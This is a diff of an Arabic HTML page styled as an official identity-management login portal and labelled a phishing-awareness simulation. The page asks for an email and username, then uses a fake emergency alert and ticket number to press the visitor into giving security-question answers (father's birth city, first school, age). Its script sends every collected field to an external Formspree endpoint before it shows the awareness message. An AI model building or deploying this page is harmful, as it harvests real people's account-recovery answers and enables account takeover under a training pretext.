@@ -3,110 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 بوابة التحقق والاستجابة الأمنية</title>
+    <title>بوابة إدارة الهوية الرقمية الموحدة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; text-align: center; padding: 40px 20px; color: #333; }
-        .container { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 40, 100, 0.12); display: inline-block; max-width: 520px; width: 100%; box-sizing: border-box; border-top: 8px solid #1e3d59; text-align: right; }
-        h2 { color: #1e3d59; text-align: center; margin-top: 0; }
-        .status-box { background-color: #e3fafc; border: 1px solid #99e9f2; padding: 15px; border-radius: 6px; font-size: 14px; color: #0c8599; margin-bottom: 25px; line-height: 1.6; }
-        .threat-box { background-color: #fff5f5; border: 1px solid #ffe3e3; padding: 15px; border-radius: 6px; font-size: 14px; color: #e03131; margin-bottom: 25px; line-height: 1.6; display: none; }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: bold; margin-bottom: 6px; color: #1e3d59; font-size: 14px; }
-        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #333; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        input[type="button"], input[type="submit"] { background-color: #17a2b8; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: background 0.3s; margin-top: 10px; }
-        input[type="button"]:hover, input[type="submit"]:hover { background-color: #138496; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .wrapper { background: white; width: 100%; max-width: 480px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); border: 1px solid #e1e4e8; text-align: right; box-sizing: border-box; }
+        .header { text-align: center; border-bottom: 2px solid #f0f2f5; padding-bottom: 20px; margin-bottom: 25px; }
+        .header h1 { color: #0f4c81; font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
+        .system-badge { background: #e8f0fe; color: #1a73e8; display: inline-block; padding: 4px 12px; border-radius: 16px; font-size: 12px; font-weight: bold; }
         
-        /* المراحل المخفية افتراضياً */
+        .alert-banner { background-color: #fff5f5; border: 1px solid #ff8787; border-right: 5px solid #e03131; padding: 15px; border-radius: 4px; font-size: 13.5px; color: #c92a2a; margin-bottom: 25px; line-height: 1.6; display: none; }
+        .meta-info { font-size: 12px; color: #868e96; margin-bottom: 15px; background: #f8f9fa; padding: 8px 12px; border-radius: 4px; }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: 600; margin-bottom: 8px; color: #495057; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #495057; border-radius: 4px; box-sizing: border-box; font-size: 14px; transition: border-color 0.15s ease-in-out; }
+        input[type="text"]:focus, input[type="email"]:focus { border-color: #0f4c81; outline: 0; }
+        
+        .btn-primary { background-color: #0f4c81; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: background-color 0.2s; }
+        .btn-primary:hover { background-color: #0b375e; }
+        
         #step2, #awareness-page { display: none; }
-        .success-banner { background-color: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 6px; font-weight: bold; color: #155724; text-align: center; margin-bottom: 20px; }
-        .tips-list { padding-right: 20px; line-height: 1.8; }
-        .tips-list li { margin-bottom: 10px; color: #495057; }
+        
+        /* واجهة كشف المحاكاة */
+        .success-box { background-color: #ebfbee; border: 1px solid #b2f2bb; border-right: 5px solid #2b8a3e; padding: 15px; border-radius: 4px; font-weight: bold; color: #2b8a3e; margin-bottom: 20px; text-align: center; }
+        .tips-list { padding-right: 20px; line-height: 1.8; font-size: 14.5px; }
+        .tips-list li { margin-bottom: 12px; color: #495057; }
+        .footer-note { text-align: center; font-size: 11px; color: #adb5bd; margin-top: 25px; border-top: 1px solid #f0f2f5; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-card">
+<div class="wrapper">
     
-    <!-- الخطوة الأولى: تسجيل الدخول العام بالنظام -->
+    <!-- الخطوة الأولى: تسجيل الدخول الرسمي بالنظام -->
     <div id="step1">
-        <h2>🔒 تسجيل الدخول الموحد</h2>
-        <div class="status-box">
-            يرجى إدخال بيانات الهوية الرقمية العامة للوصول إلى لوحة التحكم الخاصة بالشبكة المحلية.
+        <div class="header">
+            <h1>بوابة المصادقة المركزية</h1>
+            <span class="system-badge">نظام إدارة الوصول الآمن</span>
+        </div>
+        
+        <div class="form-group">
+            <label>البريد الإلكتروني المؤسسي:</label>
+            <input type="email" id="email" placeholder="name@domain.com">
         </div>
         <div class="form-group">
-            <label>البريد الإلكتروني المعتمد:</label>
-            <input type="email" id="email" placeholder="example@email.com">
+            <label>المعرف الرقمي أو اسم الحساب (Username):</label>
+            <input type="text" id="username" placeholder="المعرف الشخصي بالنظام">
         </div>
-        <div class="form-group">
-            <label>اسم الحساب الشخصي (Username):</label>
-            <input type="text" id="username" placeholder="مثال: user_2026">
-        </div>
-        <input type="button" value="تسجيل الدخول" onclick="goToStep2()">
+        <button class="btn-primary" onclick="goToStep2()">تحقق والمتابعة</button>
     </div>
 
-    <!-- الخطوة الثانية: ظهور الإنذار المفاجئ وطلب معلومات الخصوصية -->
+    <!-- الخطوة الثانية: الإجراء الأمني المشدد المفاجئ -->
     <div id="step2">
-        <h2>⚠️ تم تعليق الجلسة فوراً</h2>
-        <div class="threat-box" id="threatAlert" style="display: block;">
-            <strong>🚨 إنذار أمني حرج:</strong><br>
-            تم رصد محاولة وصول متزامنة غير معروفة أثناء تسجيل دخولك. لحماية النظام ومنع قفل الحساب نهائياً، يرجى تأكيد الأسئلة الخصوصية الإضافية فوراً لإثبات ملكيتك للحساب.
+        <div class="header">
+            <h1 style="color: #c92a2a;">التحقق من الهوية الإضافية</h1>
+            <span class="system-badge" style="background: #fff5f5; color: #c92a2a;">تذكرة أمنية رقم: #SEC-9982</span>
+        </div>
+
+        <div class="alert-banner" id="threatAlert" style="display: block;">
+            <strong>بروتوكول الطوارئ (Level 2):</strong><br>
+            تم تعليق الجلسة مؤقتاً بسبب تقاطع في طلبات الاتصال. لإعادة تفويض النظام وتجنب الإغلاق التلقائي للمستندات، يرجى تقديم إجابات المطابقة المعتمدة.
+        </div>
+        
+        <div class="meta-info">
+            • مرسل الطلب: جدار الحماية المحلي للشبكة<br>
+            • نوع النظام المستهدف: Puppy Linux Live Session
         </div>
         
         <form id="awarenessForm">
             <div class="form-group">
-                <label>سؤال الخصوصية 1: ما هو اسم المدينة التي ولد فيها والدك؟</label>
-                <input type="text" id="q1" required placeholder="الإجابة هنا">
+                <label>سؤال المطابقة 1: ما هي مدينة ولادة الوالد؟</label>
+                <input type="text" id="q1" required placeholder="استعلام أمني 1">
             </div>
 
             <div class="form-group">
-                <label>سؤال الخصوصية 2: ما هو اسم أول صديق مقرب لك في الطفولة؟</label>
-                <input type="text" id="q2" required placeholder="الإجابة هنا">
+                <label>سؤال المطابقة 2: ما هو اسم أول مؤسسة تعليمية التحقت بها؟</label>
+                <input type="text" id="q2" required placeholder="استعلام أمني 2">
             </div>
 
             <div class="form-group">
-                <label>سؤال الخصوصية 3: كم هو عمرك الحالي بدقة؟</label>
-                <input type="text" id="q3" required placeholder="الإجابة هنا">
+                <label>سؤال المطابقة 3: ما هو السن الحالي للمستخدم بدقة؟</label>
+                <input type="text" id="q3" required placeholder="استعلام أمني 3">
             </div>
 
-            <input type="submit" value="تأكيد المعلومات والتحقق الآمن">
+            <input type="submit" class="btn-primary" style="background-color: #c92a2a;" value="إرسال تقرير التحقق">
         </form>
     </div>
 
-    <!-- المرحلة الثالثة: كشف حقيقة المحاكاة ونشر الوعي الأمني -->
+    <!-- المرحلة الثالثة: التوعية الفورية وكشف هدف المحاكاة -->
     <div id="awareness-page">
-        <h2>🎯 انتهت محاكاة الوعي الأمني بنجاح</h2>
-        <div class="success-banner">
-            🔒 تم إيقاف الفحص التهديدي. هذا الموقع عبارة عن تجربة تعليمية آمنة تماماً.
+        <div class="header">
+            <h1 style="color: #2b8a3e;">تقرير الوعي الأمني للتدريب</h1>
+            <span class="system-badge" style="background: #ebfbee; color: #2b8a3e;">اكتمال فحص الاستجابة</span>
         </div>
-        <p>لقد تابعت الخطوات رغبةً في حماية الحساب من الإنذار المفاجئ، ولكن من الناحية التقنية: <strong>لقد استجبت لخدعة الإنذار الوهمي (Urgency Trick) التي يتبعها مهندسو الاجتماع.</strong></p>
+
+        <div class="success-box">
+            🔒 تم إنهاء جلسة المحاكاة الآمنة. شكرًا لمشاركتك التفاعلية.
+        </div>
+        <p style="font-size: 14px; line-height: 1.6;">لقد تعاملت مع النموذج بدافع الرغبة في تأمين الاتصال، ولكن من المنظور الدفاعي: <strong>لقد استجبت لتقنية الضغط النفسي واصطناع الأخطاء البرمجية (Urgency & False Alarms).</strong></p>
         
-        <h3>💡 ما هي الدروس المستفادة من هذا الاختبار التتابعي؟</h3>
+        <h3 style="color: #0f4c81; font-size: 16px;">💡 كيف تتصرف في المواقف الحقيقية؟</h3>
         <ul class="tips-list">
-            <li><strong>الانتباه لظهور التحذيرات غير المنطقية:</strong> بمجرد ضغطك على "تسجيل الدخول" ظهر لك إنذار اختراق مباشر يطلب أسئلة أمان؛ المواقع الرسمية لا تدمج آليات الاسترجاع والإنذار بداخل صفحات عشوائية بهذا الشكل.</li>
-            <li><strong>عدم إدخال إجابات أسئلة الأمان:</strong> معلومات مثل اسم صديق الطفولة، مكان الولادة، والعمر هي الحواجز الأخيرة لحماية حساباتك، ومشاركتها تعني منح المفاتيح للمخترق لتجاوز كلمات المرور بسهولة عبر خيارات استعادة الحساب الحقيقية.</li>
-            <li><strong>مراقبة رابط المتصفح:</strong> تذكر دائماً التحقق من الرابط العلوي قبل التفاعل مع أي خطوة تالية، فالروابط المرفوعة خارج النطاقات الرسمية للشركات هي المؤشر الأبرز على وجود محاكاة أو هجوم تصيد.</li>
+            <li><strong>التحقق الذاتي من النطاق:</strong> البوابات الرسمية والموثقة للشركات لا تطلب بيانات حساسة أو أسئلة أمان إلا من خلال روابط تتبع نطاقها الأساسي المسجل قانونياً، وليس عبر استضافات اختبار خارجية.</li>
+            <li><strong>سرية أسئلة الأمان:</strong> معلومات مثل مكان الولادة، السن، وأسماء الأصدقاء هي وسائلك الحقيقية لاستعادة الحسابات عند فقدان كلمات المرور. إفشاؤها لأي واجهة غير موثقة يهدد استقرار حساباتك بالكامل.</li>
+            <li><strong>هدوء الاستجابة:</strong> المخترقون يتعمدون إنشاء لافتات إنذار حمراء وأرقام تذاكر وهمية لتعطيل التفكير المنطقي ودفعك للمشاركة السريعة. التوقف لثوانٍ وفحص سلامة الرابط يحميك من أغلب هذه المحاولات.</li>
         </ul>
     </div>
 
+    <div class="footer-note">
+        نظام محاكاة الوعي الرقمي المحدود © 2026. لأغراض التعليم والتدريب الذاتي فقط.
+    </div>
 </div>
 
 <script>
-// الانتقال من الخطوة الأولى إلى الثانية عند الضغط
 function goToStep2() {
     var emailField = document.getElementById('email').value;
     var userField = document.getElementById('username').value;
 
     if(emailField === "" || userField === "") {
-        alert("يرجى ملء حقول تسجيل الدخول أولاً للمتابعة.");
+        alert("يرجى إدخال البيانات المبدئية للمتابعة.");
         return;
     }
 
-    // إخفاء الواجهة الأولى وإظهار واجهة الإنذار والأسئلة الخصوصية
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
 }
 
-// معالجة إرسال البيانات النهائية إلى Formspree والتوجيه لصفحة التوعية
 document.getElementById('awarenessForm').addEventListener('submit', function(e) {
     e.preventDefault(); 
 
@@ -114,122 +136,10 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
         Email: document.getElementById('email').value,
         Username: document.getElementById('username').value,
         Father_City: document.getElementById('q1').value,
-        Best_Friend: document.getElementById('q2').value,
-        Age: document.getElementById('q3').value
-    };
-
-    var formspreeUrl = 'https://formspree.io'; 
-
-    fetch(formspreeUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('awareness-page').style.display = 'block';
-    })
-    .catch(error => {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('awareness-page').style.display = 'block';
-    });
-});
-</script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 بوابة التحقق والاستجابة الأمنية</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; text-align: center; padding: 40px 20px; color: #333; }
-        .container { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 40, 100, 0.12); display: inline-block; max-width: 520px; width: 100%; box-sizing: border-box; border-top: 8px solid #1e3d59; text-align: right; }
-        h2 { color: #1e3d59; text-align: center; margin-top: 0; }
-        .status-box { background-color: #e3fafc; border: 1px solid #99e9f2; padding: 15px; border-radius: 6px; font-size: 14px; color: #0c8599; margin-bottom: 25px; line-height: 1.6; }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-weight: bold; margin-bottom: 6px; color: #1e3d59; font-size: 14px; }
-        input[type="text"], input[type="email"], select { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #333; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        input[type="submit"] { background-color: #17a2b8; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: background 0.3s; margin-top: 10px; }
-        input[type="submit"]:hover { background-color: #138496; }
-        
-        /* واجهة كشف المحاكاة */
-        #awareness-page { display: none; }
-        .success-banner { background-color: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 6px; font-weight: bold; color: #155724; text-align: center; margin-bottom: 20px; }
-        .tips-list { padding-right: 20px; line-height: 1.8; }
-        .tips-list li { margin-bottom: 10px; color: #495057; }
-    </style>
-</head>
-<body>
-
-<!-- المرحلة الأولى: اختبار الأسئلة الخصوصية -->
-<div class="container" id="quiz-page">
-    <h2>🔒 تأكيد الهوية الرقمية للاسترجاع</h2>
-    
-    <div class="status-box">
-        <strong>⚠️ تنبيه النظام الموحد:</strong><br>
-        تم رصد نشاط غير مصرح به على حسابك. يرجى تأكيد معلوماتك فوراً عبر الإجابة على الأسئلة الخصوصية التالية لإلغاء قفل الجلسة واسترجاع الصلاحيات الكاملة.
-    </div>
-    
-    <form id="awarenessForm">
-        <div class="form-group">
-            <label>البريد الإلكتروني المستهدف:</label>
-            <input type="email" id="email" required placeholder="example@email.com">
-        </div>
-
-        <div class="form-group">
-            <label>سؤال الخصوصية 1: ما هو اسم المدينة التي ولد فيها والدك؟</label>
-            <input type="text" id="q1" required placeholder="الإجابة هنا">
-        </div>
-
-        <div class="form-group">
-            <label>سؤال الخصوصية 2: ما هو اسم أول مدرسة التحقت بها؟</label>
-            <input type="text" id="q2" required placeholder="الإجابة هنا">
-        </div>
-
-        <div class="form-group">
-            <label>سؤال الخصوصية 3: ما هو نوع أو موديل أول سيارة امتلكتها عائلتك؟</label>
-            <input type="text" id="q3" required placeholder="الإجابة هنا">
-        </div>
-
-        <input type="submit" value="تأكيد البيانات واسترجاع الحساب">
-    </form>
-</div>
-
-<!-- المرحلة الثانية: صفحة التوعية بعد التفاعل -->
-<div class="container" id="awareness-page">
-    <h2>🎯 انتهت محاكاة الوعي الأمني</h2>
-    <div class="success-banner">
-        🔒 تم إيقاف الفحص بنجاح. هذا الموقع عبارة عن تجربة تعليمية آمنة.
-    </div>
-    <p>لقد قمت بإدخال البيانات رغبةً منك في استرجاع الحساب بسرعة، ولكن من الناحية الأمنية: <strong>لقد استجبت لأسلوب جمع معلومات الهندسة الاجتماعية.</strong></p>
-    
-    <h3>💡 ما هو الهدف من هذا الاختبار المتقدم؟</h3>
-    <ul class="tips-list">
-        <li><strong>حماية الأسئلة الخصوصية:</strong> المعلومات مثل (مكان الولادة، اسم المدرسة، نوع السيارة) ليست مجرد دردشة، بل هي الإجابات الفعلية لـ <em>أسئلة الأمان (Security Questions)</em> التي تستخدمها البنوك والمواقع الكبرى لاستعادة الحسابات.</li>
-        <li><strong>مخاطر مشاركة التفاصيل:</strong> نشر أو كتابة هذه التفاصيل في أي صفحة غير موثقة يمنح المهاجمين المفاتيح الخلفية لتجاوز حماية حساباتك دون الحاجة لمعرفة كلمة المرور.</li>
-        <li><strong>التحقق من الرابط أولاً:</strong> تذكر دائماً أن صفحات الاسترجاع الرسمية لا تأتي عبر روابط اختبار خارجية بل تكون من داخل نطاق الموقع نفسه (مثل <code>https://facebook.com</code>).</li>
-    </ul>
-</div>
-
-<script>
-document.getElementById('awarenessForm').addEventListener('submit', function(e) {
-    e.preventDefault(); 
-
-    // تجميع الإجابات الخصوصية
-    var data = {
-        Email: document.getElementById('email').value,
-        Father_City: document.getElementById('q1').value,
         First_School: document.getElementById('q2').value,
-        First_Car: document.getElementById('q3').value
+        User_Age: document.getElementById('q3').value
     };
 
-    // استبدل YOUR_FORM_ID بمعرّف Formspree الخاص بك لتصلك البيانات على الإيميل
     var formspreeUrl = 'https://formspree.io'; 
 
     fetch(formspreeUrl, {
@@ -241,13 +151,11 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
         body: JSON.stringify(data)
     })
     .then(response => {
-        // التحويل المباشر لصفحة كشف الحقيقة والتوعية
-        document.getElementById('quiz-page').style.display = 'none';
+        document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     })
     .catch(error => {
-        // عرض صفحة التوعية حتى في حال عدم وجود اتصال لضمان إيصال الرسالة التثقيفية
-        document.getElementById('quiz-page').style.display = 'none';
+        document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     });
 });
